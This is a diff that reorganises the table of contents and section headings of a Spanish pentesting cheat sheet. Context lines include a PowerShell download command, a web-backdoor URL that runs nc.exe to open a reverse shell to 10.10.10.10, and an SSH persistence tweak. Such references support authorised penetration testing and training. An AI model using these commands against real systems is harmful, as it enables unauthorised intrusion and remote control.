@@ -4,14 +4,14 @@
 - [File Transfers](#file-transfers)
 - [Reverse Shells](#reverse-shells)
 - [Ofuscación](#ofuscacion)
-- [Evasión](#evasion)
-- [Explotacións](#explotacion)
-- [Post-Explotación (persistencia)](#persistencia)
-- [Post-Explotación (escalada de privilegios)](#escalacion-privilegios)
+- [Explotacion](#explotacion)
+- [Persistencia](#persistencia)
+- [Escalada de privilegios](#escalada-de-privilegios)
 - [Pivoting](#pivoting)
-- [Evasion de antivirus](#antivirus)
-- [Exfiltración de datos](#exfiltracion)
+- [Evasion de antivirus](#evasion-de-antivirus)
+- [Exfiltración de datos](#exfiltración-de-datos)
 - [Limpiando huellas](#limpiar-huellas)
+- [Tips](#tips)
 
 # Commands
 
@@ -434,14 +434,12 @@ PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/fi
 Windows (Web app with command execution and nc.exe) 
 http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
 ```
-# Ofuscación
+# Ofuscacion
 
 
+ 
 
-# Evasión
-
-
-# Explotación
+# Explotacion
 
 ## Macros
 
@@ -613,7 +611,7 @@ targets left!
 ```
 Ya con esto deberíamos ser capaces de obtener root en la maquina
 
-# Post-Explotación (persistencia)
+# Persistencia
 ```sh
 nano /etc/ssh/sshd_config
 Change port 22 into 2222 and save the file. <Al hacer nmap al host el 22 cambia a 2222>
@@ -630,7 +628,7 @@ Change passwordauthentication no
 
 ```
 
-# Post-Explotación (escalada de privilegios)
+# Escalada de privilegios
 
 Interactive Shells 
 
